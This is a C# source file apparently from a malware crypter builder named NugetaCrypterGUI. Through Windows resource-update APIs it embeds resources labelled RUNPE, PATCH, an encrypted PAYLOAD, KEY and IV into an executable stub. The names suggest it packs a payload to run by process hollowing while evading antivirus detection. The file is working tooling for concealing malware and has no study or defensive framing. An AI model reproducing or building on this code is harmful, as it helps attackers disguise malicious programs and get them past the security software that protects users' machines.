using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NugetaCrypterGUI.Build
{
    internal class Build
    {
        public static void AddCode(string filename,string runpe,string patch,byte[] payload,string key,string iv)
        {
            NativeMethods.AddResource(filename, "RUNPE",Encoding.UTF8.GetBytes(runpe));
            NativeMethods.AddResource(filename, "PATCH", Encoding.UTF8.GetBytes(patch));
            NativeMethods.AddResource(filename, "PAYLOAD", payload);
            NativeMethods.AddResource(filename, "KEY", Encoding.UTF8.GetBytes(key));
            NativeMethods.AddResource(filename, "Iv", Encoding.UTF8.GetBytes(iv));
        }
    }
    internal class NativeMethods
    {
        public const uint RT_VERSION = 16u;
        public const uint RT_ICON = 3u;
        public const uint RT_GROUP_ICON = RT_ICON + 11u;

        private const uint RT_CURSOR = 0x00000001;
        private const uint RT_BITMAP = 0x00000002;
        private const uint RT_MENU = 0x00000004;
        private const uint RT_DIALOG = 0x00000005;
        private const uint RT_STRING = 0x00000006;
        private const uint RT_FONTDIR = 0x00000007;
        private const uint RT_FONT = 0x00000008;
        private const uint RT_ACCELERATOR = 0x00000009;
        private const uint RT_RCDATA = 0x0000000a;
        private const uint RT_MESSAGETABLE = 0x0000000b;

        public const uint RESOURCE_ONLY = 0x00000020u | 0x00000002u;
        public const uint LOAD_LIBRARY_AS_DATAFILE = 0x00000002;

        public const ushort ENGLISH_USA = 1033;
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(
    [MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FindResource(IntPtr hModule, string lpName,
                                          string lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll")]
        static extern IntPtr LockResource(IntPtr hResData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, uint lpType,
                                          string lpName, ushort wLanguage,
                                          byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr BeginUpdateResource(string pFileName, [
            MarshalAs(UnmanagedType.Bool)
    ] bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        public static bool AddResource(string fileName, string name, byte[] bytes)
        {
            IntPtr hUpdate = BeginUpdateResource(fileName, false);
            bool result = UpdateResource(hUpdate, RT_RCDATA, name, 0, bytes,
                                         (uint)bytes.Length);
            EndUpdateResource(hUpdate, !result);

            return result;
        }
    }
}
